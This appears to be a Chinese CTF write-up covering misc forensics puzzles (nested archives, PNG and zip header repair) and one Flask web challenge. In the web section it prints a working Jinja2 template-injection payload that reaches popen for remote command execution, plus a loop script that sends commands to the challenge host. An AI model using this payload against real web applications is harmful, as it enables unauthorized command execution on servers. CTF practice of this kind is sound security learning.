title: BJD_CTF_Misc
tags:
  - CTF
categories:
  - CTF
cover: /images/pasted-65.png
date: 2020-03-23 19:56:30
---
# Misc部分

之所以写这个部分，主要还是因为别的部分啥也不会😭😭

## 小姐姐

![upload successful](/images/pasted-38.png)
![upload successful](/images/pasted-39.png)

题目本身很简单，但是容易想复杂。
打开文件可以看到中间有错位，可以判断文件中有信息插入，于是打开十六进制编辑器搜索BJD，可以看到如下信息：
![upload successful](/images/pasted-40.png)

一道签到题

## TARGZ

![upload successful](/images/pasted-41.png)

压缩包无限套娃，下载之后可以看到文件名比较诡异，同时压缩包有密码，可以发现文件名是密码，但是解压一个压缩包会出现一个新的，可以判断嵌套试的压缩包，于是可以写个程序自动跑一下密码。
```python
import os
import sys
import time
import pexpect
def main():
    data = os.listdir()
    data.remove('1.py')
    data.remove('.DS_Store')
    file_name = data[0]
    print(data)
    password = file_name.split('.tar.gz')[0]
    print(file_name)
    child = pexpect.spawn('tar -zxf %s' % (file_name))
    child.expect('Enter passphrase:')
    child.sendline(password)
    os.remove(file_name)
    child.expect('/')
while True:
    try:
        main()
    except:
        pass
```
解压完成之后即可发现flag
![upload successful](/images/pasted-42.png)


## 美丽风景

![upload successful](/images/pasted-43.png)

![upload successful](/images/pasted-44.png)

下载之后发现是一张图片，丢进`Stegsolve`
发现CRC错误

![upload successful](/images/pasted-45.png)

但是更改CRC之后并没有什么效果，推测是图片大小改了。
由于图片大小是1000*900推测可能是1000*1000改过来的，打开十六进制编辑器，

![upload successful](/images/pasted-46.png)

更改03 84 为03 E8
即可出现答案

![upload successful](/images/pasted-47.png)



## 神秘压缩包

![upload successful](/images/pasted-48.png)
解压后是一张图片，但是打开时候提示错误

![upload successful](/images/pasted-52.png)
![upload successful](/images/pasted-49.png)


PNG文件标志由8字节数据组成：89 50 4E 47 0D 0A 1A 0Ah，其中50 4E 47对应的ASCII值是"PNG"。

![upload successful](/images/pasted-50.png)

发现文件头缺失，补全文件头，即可获得flag


![upload successful](/images/pasted-51.png)

## 图片褪色

![upload successful](/images/pasted-59.png)
下载这个，用`binwalk`跑一下，发现zip文件结尾，可以判断是文件隐写

![upload successful](/images/pasted-60.png)

然而`foremost`提取失败 
于是手工提取。

![upload successful](/images/pasted-61.png)

`FF D9`之后便是压缩包内容，然而压缩包内容不完整。
首先zip压缩包是由多个文件实体（File Entry）和多个目录源数据（Central Directory）以及一个目录结束标识（End of central directory record）组成。举个栗子：我们新建个flag.txt文件内容为xiaomeiqiu007,然后压缩成flag.zip。用winhex打开下，我稍微标记一下。

![upload successful](/images/pasted-62.png)

红色部分为：文件实体（File Entry）

主要是记录文件压缩后的主要内容通常以`504b0304`标识开头，每一被压缩的文件对应一个文件实体。文件实体中存储着当前被压缩文件的名字，文件修改时间，压缩方式，是否加密等信息。

蓝色部分为：目录源数据（Central Directory）

主要记录文件目录相关信息，如文件注释，大小，文件名等等…。由文件头（File Header）组成，通常是以504b0102标识开头

灰色部分：目录源数据结束标识（End of central directory record）


![upload successful](/images/pasted-63.png)

补上`50 4B 03 04`,即可解压成功，发现hint


![upload successful](/images/pasted-64.png)

扫描后发现是

```shell
od -vtx1 ./draw.png | head -56 | tail -28
```
执行命令，定位位置，可以获得flag

![upload successful](/images/pasted-65.png)






# 加一个web题 

Flask框架过滤不严

![upload successful](/images/pasted-53.png)

打开网页可以看到name参数可以输入参数

![upload successful](/images/pasted-54.png)

于是，试着加一下注入命令

![upload successful](/images/pasted-56.png)
![upload successful](/images/pasted-55.png)

可以看到从字符串找到父类之后，就可以找到os库
写一个简单的脚本，方便输入命令
```python
import requests
while True:
    data = input()
    url = "http://43.248.125.174:10021/qaq?name={{%22%22.__class__.__bases__[0].__subclasses__()[117].__init__. __globals__[%27popen%27](\""+data+"\").read()}}"
    print(requests.get(url).text)
```
当我们cat flag当时候，发现BJD被过滤了
![upload successful](/images/pasted-57.png)
这时候用sed做一下字符串替换就可以了
```shell
cat /flag | sed 's/BJD/hhh/g'
```

![upload successful](/images/pasted-58.png)